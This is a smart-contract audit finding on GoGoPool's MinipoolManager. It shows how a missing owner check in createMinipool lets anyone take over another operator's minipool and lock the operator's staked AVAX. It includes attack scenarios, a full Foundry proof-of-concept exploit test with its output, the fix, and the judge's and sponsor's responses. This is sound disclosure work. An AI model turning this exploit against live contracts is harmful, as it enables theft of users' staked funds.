[H-04] Hijacking of node operators minipool causes loss of staked funds
Submitted by0xdeadbeef0x, also found bybin2chen,datapunk,0xmint,Lirios,AkshaySrivastav,adriro,ak1,IllIllI,pauliax,imare,imare,immeas,sces60107,peritoflores,wagmi,Jeiwan,sk8erboy,unforgiven,caventa,yixxas,Franfran,clems4ever,Ch_301,Allarious,0xc0ffEE,0Kage,kaliberpoziomka8552,kaliberpoziomka8552,HollaDieWaldfee,wallstreetvilkas,stealthyz,cozzetti,rvierdiiev,ladboy233,chaduke,chaduke, andManboy
A malicious actor can hijack a minipool of any node operator that finished the validation period or had an error.
The impacts:
Node operators staked funds will be lost (Loss of funds)Hacker can hijack the minipool and retrieve rewards without hosting a node. (Theft of yield)
2.1 See scenario #2 comment for dependencies
Proof of Concept
Background description
The protocol created a state machine that validates transitions between minipool states. For this exploit it is important to understand three states:
Prelaunch- This state is the initial state when a minipool is created. The created minipool will have a status ofPrelaunchuntil liquid stakers funds are matched andrialtostakes 2000 AVAX into Avalanche.Withdrawable- This state is set when the 14 days validation period is over. In this state:2.1.rialtoreturned 1000 AVAX to the liquid stakers and handled reward distribution.2.2. Node operators can withdraw their staked funds and rewards.2.3. If the node operator signed up for a duration longer than 14 daysrialtowill recreate the minipool and stake it for another 14 days.Error- This state is set whenrialtohas an issue to stake the funds in Avalanche
The state machine allows transitions according therequireValidStateTransitionfunction:https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L164
function requireValidStateTransition(int256 minipoolIndex, MinipoolStatus to) private view {------} else if (currentStatus == MinipoolStatus.Withdrawable || currentStatus == MinipoolStatus.Error) {isValid = (to == MinipoolStatus.Finished || to == MinipoolStatus.Prelaunch);} else if (currentStatus == MinipoolStatus.Finished || currentStatus == MinipoolStatus.Canceled) {// Once a node is finished/canceled, if they re-validate they go back to beginning stateisValid = (to == MinipoolStatus.Prelaunch);------
In the above restrictions, we can see that the following transitions are allowed:
FromWithdrawablestate toPrelaunchstate. This transition enablesrialtoto callrecreateMinipoolFromFinishedstate toPrelaunchstate. This transition allows a node operator to re-use their nodeID to stake again in the protocol.FromErrorstate toPrelaunchstate. This transition allows a node operator to re-use their nodeID to stake again in the protocol after an error.
#2 is a needed capability, thereforecreateMinipoolallows overriding a minipool record if:nodeIDalready exists and transition toPrelaunchis permitted
createMinipool:https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L242
function createMinipool(address nodeID,uint256 duration,uint256 delegationFee,uint256 avaxAssignmentRequest) external payable whenNotPaused {---------// Create or update a minipool record for nodeID// If nodeID exists, only allow overwriting if node is finished or canceled// 		(completed its validation period and all rewards paid and processing is complete)int256 minipoolIndex = getIndexOf(nodeID);if (minipoolIndex != -1) {requireValidStateTransition(minipoolIndex, MinipoolStatus.Prelaunch);resetMinipoolData(minipoolIndex);----------setUint(keccak256(abi.encodePacked("minipool.item", minipoolIndex, ".status")), uint256(MinipoolStatus.Prelaunch));----------setAddress(keccak256(abi.encodePacked("minipool.item", minipoolIndex, ".owner")), msg.sender);----------}
THE BUG:createMinipoolcan be called byAnyonewith thenodeIDof any node operator.
IfcreateMinipoolis called at theWithdrawablestate orErrorstate:
The transaction will be allowedThe owner of the minipool will be switched to the caller.
Therefore, the minipool is hijacked and the node operator will not be able to withdraw their funds.
Exploit scenarios
As shown above, an attacker canalwayshijack the minipool and lock the node operators funds.
Cancel the minipoolEarn rewards on behalf of original NodeOp
Scenario #1 - Cancel the minipool
A hacker can hijack the minipool and immediately cancel the pool after a 14 day period is finished or an error state.
Results:
Node operator will lose all his staked AVAX1.1. This can be done by a malicious actor toALLGoGoPool stakers to lose their funds in a period of 14 days.Hacker will not lose anything and not gain anything.
Consider the following steps:
Hacker creates a node and creates a minipoolnode-1337.NodeOp registers a nodeIDnode-123and finished the 14 days stake period. State isWithdrawable.Hacker callscreateMinipoolwithnode-123and deposits 1000 AVAX. Hacker is now owner of the minipoolHacker callscancelMinipoolofnode-123and receives his staked 1000 AVAX.NodeOp cannot withdraw his staked AVAX as NodeOp is no longer the owner.Hacker can withdraw staked AVAX for bothnode-1337andnode-123
The above step #1 isnotnecessary but allow the hacker to immediately cancel the minipool without waiting 5 days.(See other submitted bug #211: “Anti griefing mechanism can be bypassed”)
┌───────────┐               ┌───────────┐            ┌───────────┐              ┌───────────┐│           │               │           │            │           │              │           ││   Rialto  │               │  NodeOp   │            │  Minipool │              │ Hacker    ││           │               │           │            │  Manager  │              │           │└─────┬─────┘               └─────┬─────┘            └─────┬─────┘              └─────┬─────┘│claimAndInitiate(Node-1337)│                        │createMinipool(Node-1337) ││recordStakingStart(...)    │                        │◄─────────────────────────┤ ┌────────────┐├───────────────────────────┼───────────────────────►│                          │ │ 1000 AVAX  ││                           │                        │                          │ │ 100 GPP    ││                           │createMinipool(Node-123)│                          │ └────────────┘│claimAndInitiate(Node-123) ├───────────────────────►│                          ││recordStakingStart(...)    │                        │                          │├───────────────────────────┼───────────────────────►│                          │┌──────────┐ │                           │                        │                          ││14 days   │ │recordStakingEnd(Node-1337)│                        │                          │└──────────┘ │recordStakingEnd(Node-123) │//STATE: WITHDRAWABLE// │                          │ ┌────────────┐├───────────────────────────┼───────────────────────►│                          │ │ 1000 AVAX  ││                           │                        │createMinipool(Node-123)  │ │Hacker=Owner││                           │                        │◄─────────────────────────┤ └────────────┘│                           │withdrawMinipoolF..(123)│                          ││                           ├───────────────────────►│cancleMinipool(Node-123)  ││                           │       REVERT!          │◄─────────────────────────┤│                           │◄───────────────────────┤      1000 AVAX           ││                           │                        ├─────────────────────────►││                           │   ┌────────────────┐   │withdrawMinipoolFunds(1337│ ┌──────────┐│                           │   │  NodeOp loses  │   │◄─────────────────────────┤ │Withdraw  ││                           │   │  his 1000 AVAX │   │      1000 AVAX + REWARDS │ │stake and ││                           │   │  Stake, cannot │   ├─────────────────────────►│ │rewards   ││                           │   │  withdraw      │   │                          │ └──────────┘│                           │   └────────────────┘   │     ┌───────────────┐    ││                           │                        │     │Hacker loses no│    ││                           │                        │     │funds, can     │    ││                           │                        │     │withdraw GPP   │    ││                           │                        │     └───────────────┘    │
Scenario #2 - Use node of node operator
In this scenario the NodeOp registers for a duration longer then 14 days. The hacker will hijack the minipool after 14 days and earn rewards on behalf of the node operators node for the rest of the duration.As the NodeOp registers for a longer period of time, it is likely he will not notice he is not the owner of the minipool and continue to use his node to validate Avalanche.
Results:
Node operator will lose all his staked AVAXHacker will gain rewards for staking without hosting a node
Important to note:
This scenario is only possible ifrecordStakingEndandrecreateMinipoolarenotcalled in the same transaction byrialto.During the research the sponsor has elaborated that they plan to perform the calls in the same transaction.The sponsor requested to submit issues related torecordStakingEndandrecreateMinipoolsingle/multi transactions for information and clarity anyway.
Consider the following steps:
Hacker creates a node and creates a minipoolnode-1337.NodeOp registers a nodeIDnode-123for 28 days duration and finished the 14 days stake period. State isWithdrawable.Hacker callscreateMinipoolwithnode-1234and deposits 1000 AVAX. Hacker is now owner of minipoolRialto callsrecreateMinipoolto restake the minipool in Avalanche. (This time: the owner is the hacker, the hardware is NodeOp)14 days have passed, hacker can withdraw the rewards and 1000 staked AVAXNodeOps cannot withdraw staked AVAX.
Foundry POC
The POC will demonstrate scenario #1.
Add the following test toMinipoolManager.t.sol:https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/test/unit/MinipoolManager.t.sol#L175
function testHijackMinipool() public {uint256 duration = 2 weeks;uint256 depositAmt = 1000 ether;uint256 avaxAssignmentRequest = 1000 ether;uint256 rewards = 10 ether;uint256 expectedRewards = (rewards/2)+(rewards/2).mulWadDown(dao.getMinipoolNodeCommissionFeePct());uint256 validationAmt = depositAmt + avaxAssignmentRequest;uint128 ggpStakeAmt = 100 ether;address hacker = address(0x1337);// Fund hacker with exact AVAX and gppvm.deal(hacker, depositAmt*2);dealGGP(hacker, ggpStakeAmt);// Fund nodeOp with exact AVAX and gppnodeOp = address(0x123);vm.deal(nodeOp, depositAmt);dealGGP(nodeOp, ggpStakeAmt);// fund ggAVAXaddress lilly = getActorWithTokens("lilly", MAX_AMT, MAX_AMT);vm.prank(lilly);ggAVAX.depositAVAX{value: MAX_AMT}();assertEq(lilly.balance, 0);vm.startPrank(hacker);// Hacker stakes GGPggp.approve(address(staking), ggpStakeAmt);staking.stakeGGP(ggpStakeAmt);// Create minipool for hackerMinipoolManager.Minipool memory hackerMp = createMinipool(depositAmt, avaxAssignmentRequest, duration);vm.stopPrank();vm.startPrank(nodeOp);// nodeOp stakes GGPggp.approve(address(staking), ggpStakeAmt);staking.stakeGGP(ggpStakeAmt);// Create minipool for nodeOpMinipoolManager.Minipool memory nodeOpMp = createMinipool(depositAmt, avaxAssignmentRequest, duration);vm.stopPrank();// Rialto stakes both hackers and nodeOp in avalanchevm.startPrank(address(rialto));minipoolMgr.claimAndInitiateStaking(nodeOpMp.nodeID);minipoolMgr.claimAndInitiateStaking(hackerMp.nodeID);// Update that staking has startedbytes32 txID = keccak256("txid");minipoolMgr.recordStakingStart(nodeOpMp.nodeID, txID, block.timestamp);minipoolMgr.recordStakingStart(hackerMp.nodeID, txID, block.timestamp);// Skip 14 days of staking durationskip(duration);// Update that staking has ended and funds are withdrawableminipoolMgr.recordStakingEnd{value: validationAmt + rewards}(nodeOpMp.nodeID, block.timestamp, 10 ether);minipoolMgr.recordStakingEnd{value: validationAmt + rewards}(hackerMp.nodeID, block.timestamp, 10 ether);vm.stopPrank();/// NOW STATE: WITHDRAWABLE ///vm.startPrank(hacker);// Hacker creates a minipool using nodeID of nodeOp// Hacker is now the owner of nodeOp minipoolminipoolMgr.createMinipool{value: depositAmt}(nodeOpMp.nodeID, duration, 0.02 ether, avaxAssignmentRequest);// Hacker immediatally cancels the nodeOp minipool, validate 1000 AVAX returnedminipoolMgr.cancelMinipool(nodeOpMp.nodeID);assertEq(hacker.balance, depositAmt);// Hacker withdraws his own minipool and receives 1000 AVAX + rewardsminipoolMgr.withdrawMinipoolFunds(hackerMp.nodeID);assertEq(hacker.balance, depositAmt + depositAmt + expectedRewards);// Hacker withdraws his staked ggpstaking.withdrawGGP(ggpStakeAmt);assertEq(ggp.balanceOf(hacker), ggpStakeAmt);vm.stopPrank();vm.startPrank(nodeOp);// NodeOp tries to withdraw his funds from the minipool// Transaction reverts because NodeOp is not the owner anymorevm.expectRevert(MinipoolManager.OnlyOwner.selector);minipoolMgr.withdrawMinipoolFunds(nodeOpMp.nodeID);// NodeOp can still release his staked gppstaking.withdrawGGP(ggpStakeAmt);assertEq(ggp.balanceOf(nodeOp), ggpStakeAmt);vm.stopPrank();}
To run the POC, execute:
forge test -m testHijackMinipool -v
Expected output:
Running 1 test for test/unit/MinipoolManager.t.sol:MinipoolManagerTest[PASS] testHijackMinipool() (gas: 2346280)Test result: ok. 1 passed; 0 failed; finished in 9.63s
Tools Used
VS Code, Foundry
Recommended Mitigation Steps
Fortunately, the fix is very simple.The reasoncreateMinipoolis called with an existingnodeIDis to re-use thenodeIDagain with the protocol. GoGoPool can validate that the owner is the same address as the calling address. GoGoPool have already implemented a function that does this:onlyOwner(index).
Consider placingonlyOwner(index)in the following area:https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L243
function createMinipool(address nodeID,uint256 duration,uint256 delegationFee,uint256 avaxAssignmentRequest) external payable whenNotPaused {----------int256 minipoolIndex = getIndexOf(nodeID);if (minipoolIndex != -1) {onlyOwner(minipoolIndex); // AUDIT: ADDED HERE----------} else {----------}
Alex the Entreprenerd (judge) commented:
The Warden has shown how, due to a lax check for State Transition, a Pool ID can be hijacked, causing the loss of the original depositBecause the attack is contingent on a logic flaw and can cause a complete loss of Principal, I agree with High Severity.Separate note: I createdissue 904. For the Finding 2 of this report, please refrain from grouping findings especially when they use different functions and relate to different issues.
emersoncloud (GoGoPool) mitigated:
Atomically recreate minipool to not allow hijack:multisig-labs/gogopool#23
Status:Mitigation confirmed, but a new medium severity issue was found. Full details inreport from hansfriese, and also included in Mitigation Review section below.